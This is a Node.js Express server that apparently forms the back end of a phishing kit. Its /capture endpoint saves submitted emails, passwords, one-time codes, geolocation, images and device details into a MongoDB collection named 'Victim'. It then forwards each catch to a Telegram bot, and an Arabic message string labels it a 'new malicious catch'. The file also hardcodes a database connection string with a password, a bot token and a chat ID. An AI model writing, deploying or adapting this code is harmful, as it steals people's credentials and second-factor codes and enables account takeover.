const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// إعداداتك الخاصة
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

mongoose.connect(MONGO_URI).then(() => console.log("Connected to Cluster0")).catch(e => console.log(e));

const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, password: String, otp: String, location: Object, image: String, device: String, date: { type: Date, default: Date.now }
}));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/capture', async (req, res) => {
    try {
        const data = req.body;
        const newVictim = new Victim(data);
        await newVictim.save();

        let message = `🚀 **صيد خبيث جديد**\n📧 إيميل: \`${data.email}\` \n🔑 باسورد: \`${data.password}\` \n📱 جهاز: ${data.device}`;
        if (data.location) message += `\n📍 موقع: http://maps.google.com/maps?q=${data.location.lat},${data.location.lon}`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
        res.status(200).send("Success");
    } catch (e) { res.status(500).send("Error"); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Master Server Active"));
